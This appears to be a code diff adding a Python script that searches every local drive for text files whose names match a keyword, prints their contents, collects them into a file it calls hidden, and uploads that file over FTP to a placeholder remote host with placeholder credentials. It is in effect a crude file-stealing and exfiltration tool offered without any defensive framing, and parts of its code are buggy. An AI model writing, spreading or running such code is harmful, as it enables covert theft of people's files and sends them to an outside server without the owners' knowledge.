@@ -1,0 +1,69 @@
+import glob, os, shutil, ftplib, string
+rs = ['%s://' % d for d in string.ascii_uppercase if os.path.exists('%s://' % d)]
+print(rs);
+print(len(rs));
+print('Execute: 10% Local Drive search complete')
+i = 0
+j = 0
+rss=[]
+ff = 'raja ram' 
+print('Execute: 20%')
+directory = "rrs"
+file_name = "rrs.txt"
+print('Execute: 30% Hidden folder named rss is created in second local drive from list')
+pth = os.path.join(rs[1], directory)
+if os.path.exists(pth):
+	shutil.rmtree(pth)
+os.makedirs(pth)
+print('Hidden folder path: ',pth)
+print('Execute: 40% Hidden file text.txt is created in hidden folder rss')
+CN = os.path.join(pth, file_name)
+print('Hidden file location: ',CN)
+file1 = open(CN, "a")
+file1.close()
+pp = CN
+print('Execute: 40% below files are present in system')
+while i != len(rs):
+  os.chdir(rs[i])
+  for file in glob.glob("**/*.txt", recursive = True):
+  	if ff in file:
+  		print(file)	
+  		completeName = os.path.join(rs[i], file)
+  		print('File path: ',completeName)
+  		f = open(completeName,'r')
+  		print(f.read())
+  		f.close()
+  		rss.append(completeName)  		
+  i += 1
+print('Execute: 100% showing result')
+print('scan done')
+print(rss)
+while j != len(rss):
+	with open(rss[j]) as trs, open(pp, "a") as rrs:
+		for line in trs:
+			rrs.write(line.rstrip("\n") +'\t'+rss[j]+"\n")
+	#shutil.copy(rss[j],pp)
+	f = open(pp,'r')
+	print(f.read())
+	f.close()
+	j+=1
+f = open(pp,'r')
+print(f.read())
+print('uploading data.......')
+filename = pp
+ftp = ftplib.FTP()
+host = "FTP CLIENT URL ENTER HERE"
+port = 21
+ftp.connect(host, port)
+print (ftp.getwelcome())
+try:
+	print ("Logging in...")
+	ftp.login("USERNAME ENTER HERE", "PASSWORD ENTER HERE")
+	ftp.dir()
+	ftp.cwd('htdocs')
+	ftp.dir()
+	with open(filename, "rb") as file:
+		ftp.storbinary(f"STOR test.txt", file)
+	ftp.dir()
+except:
+	"failed to login"
